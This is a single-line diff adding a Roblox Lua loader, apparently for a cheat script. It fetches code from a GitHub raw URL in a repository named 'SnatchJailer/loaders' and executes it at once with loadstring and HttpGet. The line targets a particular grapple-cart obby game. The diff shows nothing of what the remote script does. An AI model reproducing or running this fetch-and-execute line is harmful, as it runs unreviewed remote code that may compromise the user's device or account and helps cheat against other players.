@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/1-2-player-grapple-cart-obby-spam1-dh8b1q9zm61w8f.lua"))()
